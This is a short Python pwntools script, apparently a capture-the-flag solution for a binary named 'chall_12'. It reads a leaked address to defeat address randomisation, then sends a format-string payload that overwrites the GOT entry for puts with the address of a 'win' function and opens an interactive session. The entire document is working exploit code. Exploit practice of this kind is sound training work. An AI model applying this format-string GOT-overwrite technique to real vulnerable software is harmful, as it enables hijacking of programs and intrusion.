from pwn import *

p = process('./chall_12')

p.recvuntil(b'help: ')
leak = int(p.recvline().decode('utf-8').strip(), 16)

context.arch = 'i386'
binary = ELF(p.elf.path)
binary.address = leak - p.elf.sym['main']

log.info('binary address = ' + hex(binary.address))

putsaddr = binary.got['puts']
winaddr = binary.sym['win']
log.info(f'win = {hex(winaddr)} | puts = {hex(putsaddr)}')

payload = fmtstr_payload(6, { binary.got['puts']: binary.sym['win'] })

p.sendline(payload)
p.interactive()
